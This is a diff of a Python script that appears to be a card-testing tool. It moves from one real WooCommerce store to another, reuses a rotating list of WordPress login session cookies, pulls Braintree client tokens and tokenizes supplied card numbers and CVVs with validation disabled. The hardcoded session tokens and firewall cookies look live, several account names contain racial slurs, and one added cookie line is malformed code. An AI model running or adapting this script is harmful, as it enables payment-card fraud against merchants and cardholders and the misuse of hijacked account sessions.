@@ -18,44 +18,36 @@ def notauto(ccx):
   with open('fileb3.txt', 'r') as file:
     first_line = file.readline()
     print(n,mm,yy,cvc)
-    
+    user = generate_user_agent() 
+    print(user)
+
     last_used_times = {}
-    
+
   while True:
-    lines = '''nsiuwhuwuwuquw%7C1727924756%7Caypzf5jbUa1L4UbRNhFVkcUXEWBNduhaH6qKHyLu64g%7C598507a1a9543f360781655e17fa23f0897f43fc084f87e9c7239016f25804ad
-sjwmendndx%7C1728491839%7C7wvPZEKc6OmEqlxiMjVvYleJTndZLizRWgwwSbsOqoU%7C1fb0e16f125d8e24a59eaefc6d0afd9d17618c1eb52c042c4120eaddee960d03
-snwns%7C1728492179%7CCShnrtIRJsGN6fzpxu8Y1m2oCQ8CG9MK4shBgxwEP6x%7Cf803fda23752deda1b01a389e967f404aaa9b0044b2d54c9364391b1a6f99f7f
-snenfncn%7C1728492877%7CJUAOzVTco1DfiAHugapk6JUbYIQWf2qsZNdjzg99TB8%7C9073b029fc5184294f090efe15ba1aa088e926992e9148add9a2aea6e26d5984
-skssjdjd%7C1728493132%7CFLplcjkw4mZvETALVoIobVhpMrilhaIMcqUEPMwteX7%7C100bce6df21357cc21fa629f3cf3b72c0afb622750acb8984cface4a299b8fa4
-gaihe7wu72u%7C1727925171%7C9Q1K0IWIsC9ICPyZR1vqDlkKC1NNNzosFxy1GPZbQCe%7C0a5bbf583414c69054b3ca32cf761ce4810b6a6ecae8ba4213e78435cd3b46d2
-aman44%7C1727922535%7CgpRGVt9nhaAxCzrJu2okQKPhgf5HNWWCnXRgm0KbzcA%7Ccccf5fd924a1c201e7097e89cce934adff868cf38ef01746ee527f043a8a5245
-728yey9eh2%7C1727922881%7Cn3ElIZU6x5oE47f8MDfnF6xR3SgLE8J2LXNUd6c98gQ%7C4ad190c5531514c3becb2ebb6411199945a6bf4db9ba3b1ac162c9d49bcb2c54
-mliwhkwi7y6t%7C1727923066%7CrL0OCqGAmt8XvAIRZdd6dPXAeYEpNoQpYSbber8vgVA%7C580634fe224dff320109440b9e5eb9002fef3f7a618d8d7da9e6c74a3f293dd3
-cheetah562%7C1727079048%7CSc6ihZQZ1px24rKLGX8NcttHNjt4WlEBwo20xBCsOMx%7Cfaa03bb47747f8d60a6d4e03068214a34eee6a6fd09610861e9047cbb457a494
-mkiwvva7u926%7C1727923356%7ClJGl4ZjKYULba8Fvt0wtY9NqbvQL30P97xn6mRG5bxW%7C87f42c8a9a5deeee9145e8cba82eca6b64ed0eb81265677d13bfbd6baf74b2fb
-jakuwyuuwvhgew%7C1727923639%7CgVhn7Zx6G6LUXDcIaivKH9NwzcEjheyhqNKQ6DLkgS8%7C55bddf401da3c2d712ed2f5576b07be3821d594e6eb5609f85dc4a7be678d7c0
-haiiee3ee%7C1727923806%7CTT98bzQoBPt3RUsEbgxn2gEmiDgVVwrqlgISOWoEQQy%7C9ff71863f26ad3465f19b830eee63e36ca7fe460f62192c5ed49634630a21b06
-bskikehbsjje%7C1727924048%7Cb7cqMjZi89KXjEcqMkPQSHeKcGCXOgKAlBkiZDVey8o%7Cc0245b17b74fec4f0625880fe2cf8414134431b777607e58a84a6f4b4d884a9e
-hakiwh8wueiey%7C1727924218%7Cir7lhr071e9G2EkxuJZGY0VmWDIlADaJgXZXQZcZTbW%7Cb500d907a002d6545ec7e1063d6d821d83abf1e49e7ab2bd56f7042abf4c0373
-aman49728374%7C1727924373%7CFqlfRcYrYPCjSashGJUo3tsskfHPPAgPh0Y3jCr6ZMs%7Cfa04f1a52574f0ad724a93b3550ae7f341c8178ddcd8220190a342a7eb44b4ae
-aman8uhshw244%7C1727924587%7C9362JFnEXRELsJbhutqhW2cTuxBWQAPxvRjKUySW7Mi%7C26ef128fcaf597504a35e7818f4bfb7b88d63bbf121f381a3e11828b5b4ad601
-jaksw552%7C1727406278%7CH99UqFdY7fGps4e8gz6GMzKycl2Xsw4xjvxnsITZFLb%7C4742e806de31424233ba08f914795b316c158c51515227788de9803ca4001e0f
-cheetarandi11%7C1727407650%7CdZbCXjwFMCsoXhZjBv51OW14KWLquS1ca6eZ7fGCOJD%7Cb68b10590d89ecdc91bd79b7d49aa3f8dc91999c2c76dba6792e62486a0d2fe2
-cheetarandi%7C1727406951%7CDnL41lp4X4y1jJhwE73kgR3BlsImuDCgoHi9EwbEBRl%7Cab5fe8ee5a0882e1b40867257c0745512e3d9ae5a1ebc376a2f0ab169fa563bc
-cheetdddsarandi%7C1727422009%7CHFTDAshOxxtKlWVmrKBO9SDEMgcTodwGs3hk5ODcKoH%7C08d2b82aeaa8a5cbf46346351ff41988ce1fe80cb917f286c25e006b5e376f95
-chegghetarandi%7C1727421569%7CTwm5XFruIc94tVMX5NCTLYTV2oI9EAcPQUfGMHlJHw7%7C110675f40a9f1f197c0713c5145125ad0cae13399b535860ad62216dfc8aafde
-cheenznnjstarandi%7C1727514589%7CBXOZq4vI9yhbWBgSCXV4AkKnXAwzPQSvFpjLeNrxSui%7Cea0850d8955cccb0295c9df45e516c137af3d8d95297d67a6177501e114a837b
-chsbsbeetarandi%7C1727514970%7CNdrJ17XaSo20AznRNRcQ8ugdJtLtX3GdrAJlDDGHqJz%7C8d9333bbda532bc170310ac33efc26556b34abad96b02152f741901d1817cd27
-chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%7Ccc77c7ed87cd47d9882ca8ebd4b04989e17e5fdbbbf374cb8c0a827f3447d967'''
+    lines = '''aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656
+jakkw8828378%7C1729072193%7CfDCeif42lwb2Xl3xYuc4PrGQUkjiWyLUGKPtCEjAr6D%7C5fa56d93730a9a095e668ebc6b5f159b449b802ea6d26bfa1ef85375828af581
+aman4%7C1729600606%7CptP0SC4J395eMhosf3rQy0SioasSudJOAEkCltv3vz4%7C33e9a445cfeee0d1b02a6ec748fd51ba536b710a2461e292db99904ac510997c
+29029982dn44%7C1729085674%7CItuoYZQn6KzROVtJ5kiUvtDp0SlrrgBd2Gb610M4sTt%7C3e1e665f28544e8bc232014e6effb315376f2abce8d6ba2a122cb79e00e72ab7
+kowo7256%7C1729085833%7CnOLrP4kWrASgr78gUNYikPbY828WCMWJjhVZcGqDgSa%7C75177d0bee277109d2aa00f7ad34a3dcf56b4db8d9d284508eef70888fe582fa
+leloland362%7C1729086075%7CDdzeLhvGDpDAOZRjEFODWTbi7mdsfMC4sFun3LeAX4o%7Cdd03481728dd7d4a2c74b027ea7feadb808ed8f86c434e2036bf627ea754b57b
+yoursitehacked67%7C1729086268%7C7aeWrBSvLBRmWMjDtmQuz2if9xdQSctlSknynjhm7Yr%7C4bf58f11bc39faafaf3993fe4d837a8c98745ed1d1caef079462e498bc666dbb
+make57282%7C1729651702%7CUbdRoOaIkcsQnUHzvHcJ21d4N8M4FYicB0MS6YyrZeZ%7C2660fcd8b56e8a3109e1e92221420bf2d6e67855a2c0dd1e706ebd2d4133e524
+skk7885wu273%7C1729652503%7Cg0WGf2MURdyYntd1SypICJW9DJQWwrrBztERLxcGtPX%7C02d6d10eefafd7c5a8d683d8f1eadd3c3ae247b9a6f1507bef653a8987d17ad0
+khjk2982%7C1729652714%7C0ExxVYlVwR4pTGe9A4893FH1h6HEwQwcU5VZN9vvupS%7C41a453a300623e6b07e0a3b516e25578247814b97e9b5795cf5841b4e5de0c01
+ko572w8922882%7C1729653109%7CrdAbo4v37Ox6BUAQ0U1mdpP9dVQXzVJpEruAzev922a%7Cf64336586416f8e1f8299421159caefb8e7d46bc0f4704dd662a1d5e61306091
+nksk2882%7C1729652920%7C0bfUnjYmfgttQcsMAD4TWAL1pO6tp79qedv1AyBVVgZ%7C22cf546285fc109514a4fbb1d2673ccb5ad6eec6a558166f3e82d8883647ab4f
+lolnigga682%7C1729652122%7CVBQ3kZh7HwLpWwZLoCkeLAIBJbxGkjGk2hwEDri0dOe%7Cae445954e5069983eafb1881ba6f34143d7d698627ea4aa9cb69c3d0f7f5096c
+niggalelelund63%7C1729652241%7CENZNemMVIdlqdF0FWJ6xQ9m7Q4FloW7eiFbDsJgD8qA%7C122a17f6eed10e2ab5e0ef41a05fbdd9612a94459f1389a8aea9b3c46a1e57f8
+itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a1c59cd6d40a6cbef6c2218a03a06b31bde7d9f42d5152682b34205e6'''
     lines = lines.strip().split('\n')
     random_line_number = random.randint(0, len(lines) - 1)
     big = lines[random_line_number]
     current_time = time.time()
     if big in last_used_times:
-	        time_since_last_use = current_time - last_used_times[big]
-	        if time_since_last_use < 20:
-	            	         
-	            continue
+            time_since_last_use = current_time - last_used_times[big]
+            if time_since_last_use < 20:
+
+                continue
     if big == first_line:
       pass
     else:
@@ -65,42 +57,27 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
     file.write(big)
     print(big)
   cookies = {
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'PHPSESSID': '9922c106453b1b91f13b2aa5380a2d90',
-    '_ga': 'GA1.1.445964708.1725851995',
-    '_omappvp': '1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2',
-    '_fbp': 'fb.1.1725851998020.953269146937982147',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'mtk_src_trk': '{"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
-    'tk_ai': 'JIy%2BpgomdEccIPNxoN8V1fTc',
-    '_tt_enable_cookie': '1',
-    '_ttp': 'XSSScJcwhDPZSzCIQrl0SkubI_v',
-    'mailchimp.cart.previous_email': 'nejwjjw@gmaul.com',
-    'mailchimp.cart.current_email': 'aman44@gmail.com',
-    'mailchimp_user_previous_email': 'aman44%40gmail.com',
-    'mailchimp_user_email': 'aman44%40gmail.com',
-    '_ga_SGEGXEGQDY': 'GS1.1.1725851994.1.1.1725852841.60.0.0',
-    '_ga_WNQMQBX793': 'GS1.1.1725851997.1.1.1725852842.60.0.0',
-    'sbjs_session': 'pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F',
-    'tk_qs': '',
-    '_omappvs': '1725852843982',
+    '_fbp': 'fb.1.1727858534209.685477442657234647',
+    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
+    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
+    'wp_automatewoo_session_started': '1',
+    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
+    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F',
+    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
 }
 
   headers = {
-    'authority': 'www.studynotesaba.com',
+    'authority': 'alphawolfnutrition.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725852841.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725852842.60.0.0; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F; tk_qs=; _omappvs=1725852843982',
-    'referer': 'https://www.studynotesaba.com/my-account/payment-methods/',
+    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1727858534209.685477442657234647; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=kc11jym9ft1vjq5l75hh; wp_automatewoo_session_started=1; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F; __kla_id=eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
+    'referer': 'https://alphawolfnutrition.com/my-account/payment-methods/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -109,14 +86,59 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
-  response = requests.get('https://www.studynotesaba.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
+  response = requests.get('https://alphawolfnutrition.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
   add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
-  dec = base64.b64decode(enc).decode('utf-8')
-  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+  print(add_nonce)
+  client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
+  print(client)
+
+  cookies = {
+    'wordpress_sec_5bb3b822b32877fbbb0b41afc4e7a0c4'
+    '_fbp': 'fb.1.1727858534209.685477442657234647',
+    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
+    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
+    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
+    'wp_automatewoo_session_started': '1',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_first_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
+    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+}
+
+  headers = {
+    'authority': 'alphawolfnutrition.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    
+    'origin': 'https://alphawolfnutrition.com',
+    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': user,
+    'x-requested-with': 'XMLHttpRequest',
+}
+  data = {
+    'action': 'wc_braintree_credit_card_get_client_token',
+    'nonce': client,
+}  
+  response = requests.post('https://alphawolfnutrition.com/wp-admin/admin-ajax.php', cookies=cookies,headers=headers, data=data)
+
+  ec=(response.json()['data'])
+
+  dec = base64.b64decode(ec).decode('utf-8')
+
+  au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
   print(au)
 
   headers = {
@@ -134,14 +156,14 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
   json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'a9bf5370-61fe-4efd-ba89-65d47f2c4a14',
+        'sessionId': '9179a736-cf25-40b1-90be-5f032c8c0b41',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -151,10 +173,6 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
-                'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': 'Near Walmart 45',
-                },
             },
             'options': {
                 'validate': False,
@@ -169,45 +187,29 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
   print(tok)
 
   cookies = {
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'PHPSESSID': '9922c106453b1b91f13b2aa5380a2d90',
-    '_ga': 'GA1.1.445964708.1725851995',
-    '_omappvp': '1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2',
-    '_fbp': 'fb.1.1725851998020.953269146937982147',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
